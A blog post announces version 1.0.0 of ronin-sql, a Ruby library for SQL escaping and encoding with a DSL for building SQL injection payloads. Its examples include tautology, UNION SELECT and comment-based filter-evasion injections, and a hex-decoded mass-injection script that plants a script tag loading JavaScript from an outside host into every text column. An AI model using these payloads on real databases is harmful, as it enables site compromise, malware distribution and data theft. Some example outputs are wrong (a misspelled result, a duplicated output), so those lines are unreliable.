---
layout: post
title: ronin-sql 1.0.0 released!
author: postmodern
tags:
 - ronin
 - sql
 - sqli
 - dsl
 - 1.9
---

After six years of development and neglect, [ronin-sql] has been refactored
and version 1.0.0 has finally been released! [ronin-sql] is a library for
encoding/decoding SQL data. It also includes a Ruby Domain Specific Language
(DSL) for crafting complex [SQL Injections (SQLi)][SQLi].

## Install

[ronin-sql] is available for installation as a [RubyGem]:

    $ gem install ronin-sql

## What's New?

### Ruby 1.9

[ronin-sql] 1.0.0 requires Ruby >= 1.9.1. Ruby 1.8.7 is about to reach
[End-Of-Life][1] and it's becoming difficult to develop for both 1.8 and
1.9. Additionally, Ruby 1.9 has many [performance improvements][2] over
1.8.7. Ruby 1.9.3 can be installed via [RVM] or via [Ubuntu] / [Fedora]
packages.

### Convenience Methods

The [String#sql_escape], [String#sql_encode], [String#sql_decode] have been
moved out of [ronin-support] and into [ronin-sql].

Escape a String:

{% highlight ruby %}
"O'Brian".sql_escape
# => "'O''Brian'"
{% endhighlight %}

{% highlight ruby %}
"O'Brian".sql_escape(:double)
# => "\"O'Brian\""
{% endhighlight %}

Unescapes a SQL String:

{% highlight ruby %}
"'O''Brian'".sql_unescape
# => "O'Briand"
{% endhighlight %}

Hex encode a String:

{% highlight ruby %}
"/etc/passwd".sql_encode
# => "0x2f6574632f706173737764"
{% endhighlight %}

Hex decode a String:

{% highlight ruby %}
string = "4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D27272B5B272B40432B275D20776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72"
string.sql_decode
# => "DECLARE @T varchar(255),@C varchar(4000) DECLARE Table_Cursor CURSOR FOR select a.name,b.name from sysobjects a,syscolumns b where a.id=b.id and a.xtype='u' and (b.xtype=99 or b.xtype=35 or b.xtype=231 or b.xtype=167) OPEN Table_Cursor FETCH NEXT FROM  Table_Cursor INTO @T,@C WHILE(@@FETCH_STATUS=0) BEGIN exec('update ['+@T+'] set ['+@C+']=''\"></title><script src=\"http://www0.douhunqn.cn/csrss/w.js\"></script><!--''+['+@C+'] where '+@C+' not like ''%\"></title><script src=\"http://www0.douhunqn.cn/csrss/w.js\"></script><!--''')FETCH NEXT FROM  Table_Cursor INTO @T,@C END CLOSE Table_Cursor DEALLOCATE Table_Cursor"
{% endhighlight %}

{% highlight ruby %}
"2f6574632f706173737764".sql_decode
# => "/etc/passwd"
{% endhighlight %}

Additionally, [String#sql_unescape] has been added:

{% highlight ruby %}
"'O''Brian'".sql_unescape
# => "O'Brian"
{% endhighlight %}

### Ronin::SQL

The Ruby->SQL encoder has been refactored into into a fully-fledged [ARel]-like 
Ruby DSL:

Injecting a `1=1` test into a String value:

{% highlight ruby %}
sqli = Ronin::SQL::Injection.new(:escape => :string)
sqli.or { string(1) == string(1) }
puts sqli
# 1' OR '1'='1
{% endhighlight %}

Columns:

{% highlight ruby %}
sqli = Ronin::SQL::Injection.new
sqli.and { admin == 1 }
puts sqli
# 1 AND admin=1
{% endhighlight %}

Clauses:

{% highlight ruby %}
sqli = Ronin::SQL::Injection.new
sqli.or { 1 == 1 }.limit(0)
puts sqli
# 1 AND admin=1
{% endhighlight %}

Statements:

{% highlight ruby %}
sqli = Ronin::SQL::Injection.new
sqli.union { select(1,2,3,4,id).from(users) }
puts sqli
# 1 UNION SELECT (1,2,3,4,id) FROM users
{% endhighlight %}

Filter evasion:

{% highlight ruby %}
sqli = Ronin::SQL::Injection.new
sqli.union { select(1,2,3,4,id).from(users) }
puts sqli.to_sql(:space => '/**/')
# 1/**/UNION/**/SELECT/**/(1,2,3,4,id)/**/FROM/**/users
{% endhighlight %}

[1]: https://blog.engineyard.com/2012/ruby-1-8-7-and-ree-end-of-life/
[2]: http://blog.newrelic.com/2012/10/23/eating-the-1-9-elephant/

[SQLi]: http://en.wikipedia.org/wiki/SQL_injection

[RVM]: https://rvm.io/
[Ubuntu]: http://www.ubuntu.com/
[Fedora]: http://fedoraproject.org/

[ronin-sql]: https://github.com/ronin-ruby/ronin-sql#readme
[RubyGem]: https://rubygems.org/gems/ronin-sql

[Ruby]: http://www.ruby-lang.org/
[ARel]: https://github.com/rails/arel#readme
